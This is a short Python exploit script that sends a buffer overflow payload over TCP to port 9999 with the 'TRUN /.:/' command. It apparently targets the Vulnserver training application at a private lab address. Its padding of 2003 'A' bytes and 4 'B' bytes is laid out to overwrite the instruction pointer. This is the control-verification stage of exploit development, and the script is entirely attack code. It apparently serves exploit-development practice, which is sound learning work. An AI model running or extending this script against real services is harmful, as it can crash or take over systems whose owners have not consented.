#!/usr/bin/python3

import socket

ip = "192.168.0.101"
port = 9999

# Buffer layout: 2003 A's + 4 B's (EIP) + 100 C's (padding)
junk = "A" * 2003
eip = "B" * 4
padding = "C" * 100

payload = junk + eip + padding

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send(("TRUN /.:/" + payload).encode())
    s.close()
    print(f"Payload sent. Length: {len(payload)} bytes")
except:
    print("Could not connect to the server")
